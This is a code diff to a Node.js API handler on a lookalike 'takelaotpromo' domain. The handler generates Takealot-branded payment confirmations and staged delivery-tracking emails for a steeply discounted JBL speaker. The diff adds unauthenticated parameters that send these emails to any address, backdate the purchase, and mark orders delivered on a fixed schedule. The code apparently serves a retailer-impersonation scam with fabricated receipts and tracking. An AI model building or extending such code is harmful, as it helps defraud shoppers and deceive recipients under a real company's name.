@@ -4,6 +4,8 @@
 //
 // Usage: GET /api/order?id=T273493929180165
 //        GET /api/order?latest=1&resend=1
+//        GET /api/order?order=T...&auto_notify=1
+//        GET /api/order?order=T...&send_stage=2
 //
 // Required env vars:
 //   UPSTASH_REDIS_REST_URL
@@ -11,14 +13,24 @@
 
 'use strict';
 
-const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
-const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
+const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL || process.env.REDIS_URL;
+const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN || process.env.REDIS_TOKEN;
 
 const fs = require('fs');
 const path = require('path');
 
+const { computeOrderDates } = require('./_dates');
+const {
+  processOrderDailyEmail,
+  STAGES,
+  calculateSADaysElapsed,
+  getSADateIso,
+  formatDeliveryDateShort,
+} = require('./cron');
+
 // Upstash REST helpers
 async function kv_get(key) {
+  if (!REDIS_URL || !REDIS_TOKEN) return null;
   const res = await fetch(REDIS_URL, {
     method: 'POST',
     headers: {
@@ -34,6 +46,7 @@ async function kv_get(key) {
 }
 
 async function kv_set(key, value) {
+  if (!REDIS_URL || !REDIS_TOKEN) return false;
   const res = await fetch(REDIS_URL, {
     method: 'POST',
     headers: {
@@ -48,6 +61,7 @@ async function kv_set(key, value) {
 
 // Find the most recent order across all keys
 async function getLatestOrder() {
+  if (!REDIS_URL || !REDIS_TOKEN) return null;
   const res = await fetch(REDIS_URL, {
     method: 'POST',
     headers: {
@@ -80,16 +94,13 @@ async function getLatestOrder() {
   return orders[0];
 }
 
-const { computeOrderDates } = require('./_dates');
-
 function renderOrderPlainText(order) {
   const dates = computeOrderDates(order.received_date, order.delivery_date);
   const orderDateShort = order.order_date_formatted || dates.order_date_formatted;
   const deliveryDateLong = order.delivery_date_long || dates.delivery_date_long;
   const customerName = order.customer_name || 'Customer';
   const orderNumber = order.order_id;
-  const variant = 'Premium Black';
-  const trackUrl = `https://takelaotpromo.vercel.app/track.html?order=${orderNumber}`;
+  const trackUrl = `https://takelaotpromo.vercel.app/track.html?order=${encodeURIComponent(orderNumber)}`;
 
   return [
     `TAKEALOT PAYMENT CONFIRMATION`,
@@ -134,7 +145,7 @@ function renderOrderPlainText(order) {
   ].join('\n');
 }
 
-// Self-healing & on-demand email sender
+// Self-healing & on-demand email sender (Day 0 confirmation)
 async function ensureEmailSent(order, force = false) {
   if (!order || (!force && order.email_status === 'SENT') || !order.customer_email) return false;
 
@@ -149,14 +160,14 @@ async function ensureEmailSent(order, force = false) {
     const template = fs.readFileSync(path.join(process.cwd(), 'email.index'), 'utf8');
     const dates = computeOrderDates(order.received_date, order.delivery_date);
     const orderDateShort = order.order_date_formatted || dates.order_date_formatted;
-    const deliveryDateIso = order.delivery_date_iso || dates.delivery_date_iso;
+    const deliveryDateShort = order.delivery_date_formatted || dates.delivery_date_formatted;
     const deliveryDateLong = order.delivery_date_long || dates.delivery_date_long;
 
     html = template
       .replace(/\{\{customer_name\}\}/g, order.customer_name || 'Customer')
       .replace(/\{\{order_number\}\}/g, order.order_id)
       .replace(/\{\{order_date\}\}/g, orderDateShort)
-      .replace(/\{\{delivery_date\}\}/g, deliveryDateIso)
+      .replace(/\{\{delivery_date\}\}/g, deliveryDateShort)
       .replace(/\{\{delivery_date_long\}\}/g, deliveryDateLong)
       .replace(/\{\{variant\}\}/g, 'Premium Black');
   } catch (err) {
@@ -188,7 +199,9 @@ async function ensureEmailSent(order, force = false) {
       order.email_status = 'SENT';
       order.email_sent_at = new Date().toISOString();
       order.email_message_id = (data && data.id) || null;
-      await kv_set('order:' + order.order_id, order).catch(() => {});
+      if (REDIS_URL && REDIS_TOKEN) {
+        await kv_set('order:' + order.order_id, order).catch(() => {});
+      }
       console.log('[order-email] Successfully sent to', order.customer_email);
       return true;
     } else {
@@ -209,20 +222,18 @@ function publicView(order) {
   const dates = computeOrderDates(order.received_date, order.delivery_date);
   return {
     order_id:                order.order_id,
-    product_name:            order.product_name,
-    product_price:           order.product_price,
-    currency:                order.currency,
-    product_image:           order.product_image,
-    received_date:           order.received_date,
-    delivery_date:           order.delivery_date,
+    product_name:            order.product_name || 'JBL PartyBox 520 Portable Battery-Powered Party Speaker - Black With 2 JBL Wireless Microphones',
+    product_price:           order.product_price || 799,
+    currency:                order.currency || 'ZAR',
+    product_image:           order.product_image || 'https://takelaotpromo.vercel.app/images/jbl-partybox-520-main.png',
+    received_date:           dates.received_date,
+    delivery_date:           dates.delivery_date,
+    order_date_upper:        dates.order_date_upper,
     order_date_formatted:    order.order_date_formatted || dates.order_date_formatted,
     delivery_date_formatted: order.delivery_date_formatted || dates.delivery_date_formatted,
     delivery_date_long:      order.delivery_date_long || dates.delivery_date_long,
-    delivery_date_iso:       order.delivery_date_iso || dates.delivery_date_iso,
-    tracking_url:            order.tracking_url,
-    status:                  order.status,
-    email_status:            order.email_status || null,
-    email_sent_at:           order.email_sent_at || null,
+    tracking_url:            order.tracking_url || (`https://takelaotpromo.vercel.app/track.html?order=` + encodeURIComponent(order.order_id)),
+    status:                  order.status || 'PROCESSING',
     status_history: (order.status_history || []).map(function(e) {
       return { status: e.status, timestamp: e.timestamp };
     }),
@@ -239,6 +250,9 @@ module.exports = async function handler(req, res) {
   if (req.method !== 'GET') return res.status(405).json({ error: 'Method Not Allowed' });
 
   if (req.query.list === '1') {
+    if (!REDIS_URL || !REDIS_TOKEN) {
+      return res.status(500).json({ error: 'Redis environment variables not configured' });
+    }
     try {
       const resKeys = await fetch(REDIS_URL, {
         method: 'POST',
@@ -261,7 +275,9 @@ module.exports = async function handler(req, res) {
               email_sent_at: val.email_sent_at,
               created_at: val.created_at,
               received_date: val.received_date,
+              delivery_date: val.delivery_date,
               status: val.status,
+              last_daily_email_date: val.last_daily_email_date,
             });
           }
         } catch (_) {}
@@ -299,19 +315,56 @@ module.exports = async function handler(req, res) {
     }
 
     if (order) {
-      if (!order.order_date_formatted || !order.delivery_date_formatted) {
-        const dates = computeOrderDates(order.received_date, order.delivery_date);
-        order.order_date_formatted = dates.order_date_formatted;
-        order.delivery_date_formatted = dates.delivery_date_formatted;
-        order.delivery_date_long = dates.delivery_date_long;
-        order.delivery_date_iso = dates.delivery_date_iso;
-        if (REDIS_URL && REDIS_TOKEN) {
-          try { await kv_set('order:' + orderId, order); } catch (_) {}
+      // Existing order: NEVER reset or overwrite past purchase/delivery dates
+      if (order.received_date) {
+        const rec = new Date(order.received_date);
+        if (!isNaN(rec.getTime())) {
+          if (!order.delivery_date) {
+            order.delivery_date = new Date(rec.getTime() + 8 * 86400000).toISOString();
+          }
+          // Dynamic status progression based on SAST elapsed days
+          const daysElapsed = calculateSADaysElapsed(rec);
+          if (daysElapsed >= 8 && order.status !== 'CANCELLED') {
+            order.status = 'DELIVERED';
+          } else if (daysElapsed >= 1 && order.status === 'PROCESSING') {
+            order.status = 'IN_TRANSIT';
+          }
+
+          if (!order.order_date_formatted || !order.delivery_date_formatted) {
+            const dates = computeOrderDates(order.received_date, order.delivery_date);
+            order.order_date_formatted = dates.order_date_formatted;
+            order.delivery_date_formatted = dates.delivery_date_formatted;
+            order.delivery_date_long = dates.delivery_date_long;
+            order.delivery_date_iso = dates.delivery_date_iso;
+          }
+
+          if (REDIS_URL && REDIS_TOKEN) {
+            kv_set('order:' + orderId, order).catch(() => {});
+          }
         }
       }
     } else {
-      const now = new Date().toISOString();
-      const dates = computeOrderDates(now);
+      // New order created on the fly: exact purchase date at this moment
+      let purchaseDate = new Date();
+      const pParam = req.query.p || req.query.received_date || req.query.date;
+      if (pParam) {
+        const num = Number(pParam);
+        const parsed = !isNaN(num) && num > 1000000000 ? new Date(num > 10000000000 ? num : num * 1000) : new Date(pParam);
+        if (!isNaN(parsed.getTime())) {
+          purchaseDate = parsed;
+        }
+      }
+
+      const purchaseIso = purchaseDate.toISOString();
+      const deliveryIso = new Date(purchaseDate.getTime() + 8 * 86400000).toISOString();
+      const dates = computeOrderDates(purchaseIso, deliveryIso);
+
+      const daysElapsed = calculateSADaysElapsed(purchaseDate);
+      let calculatedStatus = 'PROCESSING';
+      if (daysElapsed >= 1 && daysElapsed < 7) calculatedStatus = 'IN_TRANSIT';
+      else if (daysElapsed >= 7 && daysElapsed < 8) calculatedStatus = 'OUT_FOR_DELIVERY';
+      else if (daysElapsed >= 8) calculatedStatus = 'DELIVERED';
+
       order = {
         order_id: orderId,
         customer_name: (req.query.name || 'Customer').trim(),
@@ -322,22 +375,22 @@ module.exports = async function handler(req, res) {
         product_price: 799,
         currency: 'ZAR',
         product_image: 'https://takelaotpromo.vercel.app/images/jbl-partybox-520-main.png',
-        received_date: now,
-        delivery_date: dates.delivery_date,
+        received_date: purchaseIso,
+        delivery_date: deliveryIso,
         order_date_formatted: dates.order_date_formatted,
         delivery_date_formatted: dates.delivery_date_formatted,
         delivery_date_long: dates.delivery_date_long,
         delivery_date_iso: dates.delivery_date_iso,
         tracking_url: 'https://takelaotpromo.vercel.app/track.html?order=' + encodeURIComponent(orderId),
-        status: 'PROCESSING',
+        status: calculatedStatus,
         status_history: [
-          { status: 'RECEIVED', timestamp: now },
-          { status: 'PAID', timestamp: now },
-          { status: 'PROCESSING', timestamp: now },
+          { status: 'RECEIVED', timestamp: purchaseIso },
+          { status: 'PAID', timestamp: purchaseIso },
+          { status: 'PROCESSING', timestamp: purchaseIso },
         ],
         email_status: 'PENDING',
         email_sent_at: null,
-        created_at: now,
+        created_at: purchaseIso,
       };
       if (REDIS_URL && REDIS_TOKEN) {
         try { await kv_set('order:' + orderId, order); } catch (_) {}
@@ -347,27 +400,109 @@ module.exports = async function handler(req, res) {
 
   const overrideEmail = (req.query.to || req.query.email || '').trim();
   if (overrideEmail && overrideEmail.includes('@')) {
-    order = Object.assign({}, order, { customer_email: overrideEmail });
+    order.customer_email = overrideEmail;
     if (req.query.name) order.customer_name = req.query.name.trim();
+    if (REDIS_URL && REDIS_TOKEN && order.order_id) {
+      try { await kv_set('order:' + order.order_id, order); } catch (_) {}
+    }
+  }
+
+  // Handle on-demand stage sending: ?send_stage=N or ?stage=N
+  let stageSendResult = null;
+  const stageParam = req.query.send_stage !== undefined ? req.query.send_stage : req.query.stage;
+  if (stageParam !== undefined && stageParam !== '') {
+    const stgNum = Number(stageParam);
+    if (!isNaN(stgNum)) {
+      stageSendResult = await processOrderDailyEmail(order, { force: true, stageOverride: stgNum });
+    }
+  }
+
+  // Auto notify: ?auto_notify=1 checks and sends today's daily email if pending
+  let autoNotifyResult = null;
+  if (req.query.auto_notify === '1' && order.customer_email) {
+    const pDate = new Date(order.received_date || order.created_at || Date.now());
+    const daysElapsed = calculateSADaysElapsed(pDate);
+    if (daysElapsed === 0) {
+      if (order.email_status !== 'SENT') {
+        await ensureEmailSent(order, false);
+      }
+    } else if (daysElapsed >= 1 && daysElapsed <= 8) {
+      const todaySA = getSADateIso(new Date());
+      if (order.last_daily_email_date !== todaySA) {
+        autoNotifyResult = await processOrderDailyEmail(order, { force: false });
+      }
+    } else if (daysElapsed >= 9 && order.status !== 'DELIVERED') {
+      order.status = 'DELIVERED';
+      order.email_delivered_status = 'SENT';
+      if (REDIS_URL && REDIS_TOKEN) {
+        kv_set('order:' + order.order_id, order).catch(() => {});
+      }
+    }
   }
 
   let sentResult = null;
-  if (order.email_status !== 'SENT' || forceResend) {
-    sentResult = await ensureEmailSent(order, true);
+  if ((forceResend || isLatest || order.email_status !== 'SENT') && order.customer_email && !stageSendResult) {
+    sentResult = await ensureEmailSent(order, forceResend || isLatest);
   }
 
   const responseData = publicView(order);
-  if (isLatest || forceResend) {
+  if (stageSendResult) {
+    responseData.stage_sent = stageSendResult;
+  }
+  if (autoNotifyResult) {
+    responseData.auto_notify_result = autoNotifyResult;
+  }
+  if (forceResend || isLatest) {
     responseData.email_triggered = true;
     responseData.email_sent_now = sentResult;
     if (order.customer_email) {
       const parts = order.customer_email.split('@');
-      responseData.recipient = parts[0].slice(0, 3) + '***@' + (parts[1] || '');
-    }
-    if (order.customer_name) {
-      responseData.customer_name = order.customer_name;
+      responseData.recipient_masked = parts[0].slice(0, 3) + '***@' + (parts[1] || '');
     }
   }
 
   return res.status(200).json(responseData);
 };
+
+// Send specific or stage-based order email on demand
+async function sendOrderStatusEmail(order, statusType, force = false) {
+  if (!order || !order.customer_email) return false;
+
+  // Day 0: payment confirmation
+  if (!statusType || statusType === 'CONFIRMATION' || statusType === 'PAID' || statusType === 0 || statusType === '0') {
+    return await ensureEmailSent(order, force);
+  }
+
+  // Daily stages 1 to 8:
+  let stageNum = null;
+  if (typeof statusType === 'number') {
+    stageNum = statusType;
+  } else if (!isNaN(Number(statusType))) {
+    stageNum = Number(statusType);
+  } else {
+    const s = String(statusType).toUpperCase();
+    if (s === 'PACKED') stageNum = 1;
+    else if (s === 'SHIPPED') stageNum = 2;
+    else if (s === 'IN_TRANSIT') stageNum = 3;
+    else if (s === 'REGIONAL_HUB') stageNum = 4;
+    else if (s === 'SORTING') stageNum = 5;
+    else if (s === 'LOCAL_DEPOT' || s === 'DEPOT') stageNum = 6;
+    else if (s === 'OUT_FOR_DELIVERY' || s === 'TOMORROW') stageNum = 7;
+    else if (s === 'DELIVERED') stageNum = 8;
+  }
+
+  if (stageNum !== null && stageNum >= 1 && stageNum <= 8) {
+    const res = await processOrderDailyEmail(order, { force, stageOverride: stageNum });
+    return !!(res && res.action && res.action.startsWith('SENT_STAGE_'));
+  }
+
+  // Fallback: calculate automatically from elapsed SAST days
+  const autoRes = await processOrderDailyEmail(order, { force });
+  return !!(autoRes && autoRes.action && autoRes.action.startsWith('SENT_STAGE_'));
+}
+
+module.exports.sendOrderStatusEmail = sendOrderStatusEmail;
+module.exports.ensureEmailSent = ensureEmailSent;
+module.exports.publicView = publicView;
+module.exports.calculateSADaysElapsed = calculateSADaysElapsed;
+module.exports.getSADateIso = getSADateIso;
